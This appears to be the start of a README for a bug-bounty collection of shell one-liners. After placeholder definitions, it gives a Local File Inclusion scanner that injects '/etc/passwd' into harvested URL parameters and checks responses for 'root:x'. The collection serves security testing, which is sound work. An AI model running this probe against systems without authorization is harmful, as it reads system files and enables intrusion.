# Can I Check [![Awesome](https://awesome.re/badge-flat2.svg)](https://awesome.re)
> A collection of awesome one-liner scripts especially for bug bounty.

This repository stores and houses various one-liner for bug bounty tips provided by me as well as contributed by the community. Your contributions and suggestions are heartily♥ welcome.

This section defines specific terms or placeholders that are used throughout one-line command/scripts.

- 1.1. "**HOST**" defines one hostname, (sub)domain, or IP address, e.g. replaced by `internal.host`, `domain.tld`, `sub.domain.tld`, or `127.0.0.1`.
- 1.2. "**HOSTS.txt**" contains criteria 1.1 with more than one in file.
- 2.1. "**URL**" definitely defines the URL, e.g. replaced by `http://domain.tld/path/page.html` or somewhat starting with HTTP/HTTPS protocol.
- 2.2. "**URLS.txt**" contains criteria 2.1 with more than one in file.
- 3.1. "**FILE.txt**" or "**FILE**`{N}`**.txt**" means the files needed to run the command/script according to its context and needs.
- 4.1. "**OUT.txt**" or "**OUT**`{N}`**.txt**" means the file as the target storage result will be the command that is executed.

---

### Local File Inclusion
> libralog
```bash
gau -f HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -v -L --retry 3 --retry-delay 5 --retry-max-time 30 -s "%" 2>&1 | grep -q "root:x" && echo -e "\e[31mVULN! %\e[0m" || echo -e "\e[32mSAFE! %\e[0m"'
```
